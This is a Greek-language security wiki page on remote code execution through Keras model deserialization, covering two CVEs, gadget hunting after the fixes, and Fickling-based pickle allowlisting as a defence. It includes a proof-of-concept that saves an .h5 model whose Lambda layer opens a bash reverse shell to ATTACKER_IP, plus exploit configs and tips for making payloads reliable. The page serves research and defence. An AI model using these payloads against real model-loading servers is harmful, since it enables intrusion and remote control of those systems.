# RCE κατά την αποσειριοποίηση μοντέλων Keras και αναζήτηση gadgets

Αυτή η σελίδα συνοψίζει πρακτικές τεχνικές εκμετάλλευσης κατά του pipeline αποσειριοποίησης μοντέλων Keras, εξηγεί τα εσωτερικά και την επιφάνεια επίθεσης της εγγενούς μορφής .keras και παρέχει ένα toolkit για ερευνητές, για την εύρεση Model File Vulnerabilities (MFVs) και post-fix gadgets.

## Εσωτερικά της μορφής μοντέλου .keras

Ένα αρχείο .keras είναι ένα ZIP archive που περιέχει τουλάχιστον:<sup>[[1]](#references)</sup>
- metadata.json – γενικές πληροφορίες (π.χ. έκδοση Keras)
- config.json – αρχιτεκτονική μοντέλου (κύρια επιφάνεια επίθεσης)
- model.weights.h5 – βάρη σε HDF5

Το config.json καθοδηγεί την αναδρομική αποσειριοποίηση: το Keras εισάγει modules, επιλύει classes/functions και ανακατασκευάζει layers/objects από dictionaries που ελέγχονται από τον attacker.<sup>[[1]](#references)</sup>

Παράδειγμα αποσπάσματος για ένα object Dense layer:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Η Deserialization εκτελεί:<sup>[[1]](#references)</sup>
- Εισαγωγή module και επίλυση symbol από τα keys module/class_name
- Κλήση from_config(...) ή constructor με kwargs που ελέγχονται από τον attacker
- Αναδρομή σε nested objects (activations, initializers, constraints κ.λπ.)

Ιστορικά, αυτό παρείχε στον attacker τρία primitives για τη δημιουργία του config.json:<sup>[[1]](#references)</sup>
- Έλεγχο των modules που εισάγονται
- Έλεγχο των classes/functions που επιλύονται
- Έλεγχο των kwargs που περνούν στους constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Το legacy Lambda deserialization ανακατασκεύαζε μια Python function από marshaled code που ελεγχόταν από τον attacker: το `func_load()` κάνει base64-decode το payload, καλεί `marshal.loads()` και δημιουργεί ένα `FunctionType`. Το bytecode της resulting function εκτελείται όταν γίνεται invoke του Lambda, ενώ οι loaders πριν από την έκδοση 2.13 δεν επέβαλλαν safe-mode checks για legacy formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Σε ένα native Keras v3 archive, η Lambda function αναπαρίσταται ως ένα `__lambda__` object, του οποίου το πεδίο `code` περιέχει base64-encoded marshaled code:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigation:
- Το Keras επιβάλλει `safe_mode=True` από προεπιλογή για την εγγενή μορφή Keras v3. Τα serialized Python lambdas στο `Lambda` αποκλείονται, εκτός εάν ο χρήστης επιλέξει ρητά την απενεργοποίηση της προστασίας με `safe_mode=False`. Αυτή η προστασία δεν καλύπτει τις παλαιότερες μορφές με τον ίδιο τρόπο.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes:
- Οι παλαιότερες μορφές (παλαιότερα saves σε HDF5) ή οι παλαιότερες codebases ενδέχεται να μην εφαρμόζουν τους σύγχρονους ελέγχους, επομένως attacks τύπου “downgrade” μπορούν ακόμη να εφαρμοστούν όταν τα θύματα χρησιμοποιούν παλαιότερους loaders.

## CVE-2025-1550 – Arbitrary module import in Keras 3.0.0–3.8.x

Root cause:
- Το `_retrieve_class_or_fn` χρησιμοποιούσε `importlib.import_module(module)` σε strings modules που ελέγχονταν από τον attacker και προέρχονταν από το `config.json`.
- Impact: Ένα τροποποιημένο `.keras` archive μπορούσε να προκαλέσει στο `Model.load_model()` την εισαγωγή modules και functions που επέλεγε ο attacker, με side effects κατά το import και arguments που ελέγχονταν από τον attacker, ακόμη και με `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Βελτιώσεις ασφάλειας (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist modules: οι imports περιορίζονται στα επίσημα modules του ecosystem: keras, keras_hub, keras_cv, keras_nlp
- Προεπιλεγμένο safe mode: το safe_mode=True αποκλείει την unsafe φόρτωση serialized-function του Lambda
- Basic type checking: τα deserialized objects πρέπει να αντιστοιχούν στους αναμενόμενους τύπους

## Πρακτική exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Τα legacy TensorFlow-Keras deployments ενδέχεται να δέχονται ακόμη αρχεία μοντέλων HDF5 (`.h5`). Αν ένας attacker μπορεί να ανεβάσει ένα model που ο server θα φορτώσει αργότερα ή θα χρησιμοποιήσει για inference, ένας affected loader μπορεί να κάνει deserialize ένα Lambda layer που περιέχει Python υπό τον έλεγχο του attacker και στη συνέχεια να το εκτελέσει στο model workflow της εφαρμογής.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimal PoC για τη δημιουργία ενός malicious .h5, του οποίου το Lambda εκτελεί reverse shell όταν ο target κάνει invoke το model:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Σημεία ενεργοποίησης και συμβουλές αξιοπιστίας:
- Τα trigger points διαφέρουν ανά format και workflow· το write-up που αναφέρεται παρατήρησε ότι το payload εκτελέστηκε δύο φορές κατά την πρόβλεψη. Θεωρήστε τα side effects επαναλαμβανόμενα και καταστήστε τα payloads idempotent.<sup>[[7]](#references)</sup>
- Κλείδωμα εκδόσεων: αντιστοιχίστε τα TF/Keras/Python του victim για να αποφύγετε ασυμφωνίες serialization. Για παράδειγμα, δημιουργήστε artifacts σε Python 3.8 με TensorFlow 2.13.1, εάν αυτό χρησιμοποιεί ο στόχος.<sup>[[7]](#references)</sup>
- Γρήγορη αναπαραγωγή περιβάλλοντος:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: ένα benign payload όπως το `os.system("ping -c 1 YOUR_IP")` βοηθά στην επιβεβαίωση της εκτέλεσης (π.χ., παρατηρώντας ICMP με το `tcpdump`) πριν από τη μετάβαση σε reverse shell.<sup>[[7]](#references)</sup>

## Επιφάνεια gadget μετά τη διόρθωση μέσα στο allowlist

Ακόμη και με το Keras module allowlist και το safe mode, τα επιτρεπόμενα callables μπορούν να εκθέσουν side effects. Για παράδειγμα, το `keras.utils.get_file` κατεβάζει ένα URL και το εγγράφει στη διαμορφωμένη τοποθεσία cache, καθιστώντας το υποψήφιο για gadget analysis.<sup>[[1]](#references)[[19]](#references)</sup>

Υποψήφια διαμόρφωση Lambda (επικυρώστε το call signature σε ελεγχόμενο test):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Σημαντικός περιορισμός:
- Το `Lambda.call()` περνά πάντα το model input ως πρώτο positional argument και τα διαμορφωμένα `arguments` ως keyword arguments. Για το `get_file`, αυτή η positional τιμή συμπληρώνει το `fname`; μια ασυμφωνία tensor/path μπορεί να κάνει αυτό το candidate να αποτύχει πριν από οποιοδήποτε download, επομένως δεν αποτελεί εγγυημένα λειτουργικό gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Allowlisting imports του ML pickle για AI/ML models (Fickling)

Πολλά AI/ML model formats (PyTorch `.pt`/`.pth`/`.ckpt`, artifacts των joblib/scikit-learn και άλλα Python-native formats) ενσωματώνουν δεδομένα Python pickle. Η παλαιότερη διαδρομή Keras Lambda παραπάνω χρησιμοποιεί αντίθετα marshaled function bytecode, επομένως αποτελεί ξεχωριστό deserialization risk. Τα pickle opcodes μπορούν να καλέσουν συμπεριφορά που ελέγχεται από attacker κατά το deserialization, συμπεριλαμβανομένων model tampering ή RCE, ενώ οι απλοί scanners μπορεί να παραλείψουν νέα ή μη καταχωρισμένα επικίνδυνα imports.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Μια πρακτική fail-closed άμυνα είναι να γίνει hook στον pickle deserializer της Python και να επιτρέπεται κατά το unpickling μόνο ένα ελεγμένο σύνολο harmless ML-related imports. Το Fickling των Trail of Bits υλοποιεί αυτή την πολιτική και παρέχει ένα curated ML import allowlist, το οποίο δημιουργήθηκε από χιλιάδες public Hugging Face pickles.<sup>[[8]](#references)[[13]](#references)</sup>

Security model για “safe” imports (διαισθήσεις που προκύπτουν από research και practice): τα imported symbols που χρησιμοποιούνται από ένα pickle πρέπει ταυτόχρονα:<sup>[[8]](#references)</sup>
- Να μην εκτελούν κώδικα ή προκαλούν execution (χωρίς compiled/source code objects, shelling out, hooks κ.λπ.)
- Να μην κάνουν get/set αυθαίρετων attributes ή items
- Να μην κάνουν import ή αποκτούν references σε άλλα Python objects από το pickle VM
- Να μην ενεργοποιούν secondary deserializers (π.χ. marshal, nested pickle), ούτε έμμεσα

Ενεργοποιήστε τα protections του Fickling όσο το δυνατόν νωρίτερα κατά το process startup, ώστε να ελέγχονται όλα τα pickle loads που εκτελούνται από frameworks (`torch.load`, `joblib.load`, κ.λπ.):<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Συμβουλές λειτουργίας:
- Μπορείτε να απενεργοποιείτε/επανενεργοποιείτε προσωρινά τα hooks όπου χρειάζεται:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Εάν ένα known-good model αποκλειστεί, επεκτείνετε τη allowlist για το περιβάλλον σας αφού ελέγξετε τα symbols:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Το Fickling προσφέρει επίσης generic runtime guards, αν προτιμάτε πιο λεπτομερή έλεγχο:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Προτιμήστε non-pickle model formats όταν είναι δυνατό (π.χ. SafeTensors).<sup>[[15]](#references)</sup> Αν πρέπει να αποδεχτείτε pickle, εκτελέστε τους loaders με ελάχιστα δικαιώματα, χωρίς network egress, και επιβάλετε το allowlist.

Αυτή η allowlist-first στρατηγική αποκλείει αποδεδειγμένα κοινές ML pickle exploit paths, διατηρώντας παράλληλα υψηλή συμβατότητα. Στο benchmark του ToB, το Fickling εντόπισε το 100% των συνθετικών κακόβουλων αρχείων και επέτρεψε περίπου το 99% των clean αρχείων από κορυφαία Hugging Face repos.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) Systematic gadget discovery in allowed modules

Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Άμεσο testing deserialization (δεν απαιτείται .keras archive)

Τροφοδοτήστε crafted dicts απευθείας στους Keras deserializers για να μάθετε τις αποδεκτές παραμέτρους και να παρατηρήσετε τα side effects.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Διερεύνηση μεταξύ εκδόσεων και formats

Το Keras υπάρχει σε πολλαπλές codebases/eras με διαφορετικά guardrails και formats:<sup>[[1]](#references)</sup>
- Ενσωματωμένο Keras του TensorFlow: tensorflow/python/keras (legacy, προορίζεται για διαγραφή)
- tf-keras: συντηρείται ξεχωριστά
- Multi-backend Keras 3 (official): εισήγαγε το native .keras

Επαναλάβετε τις δοκιμές σε διαφορετικές codebases και formats (.keras έναντι legacy HDF5) για να εντοπίσετε regressions ή guards που λείπουν.

## References

- [1] [Διερεύνηση ευπαθειών στο Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Προσθήκη ελέγχων στο serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Ο νέος AI/ML pickle file scanner του Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Ασφάλεια AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Ιστορικό των Sleepy Pickle attacks](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers Allow Arbitrary Code Injection](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
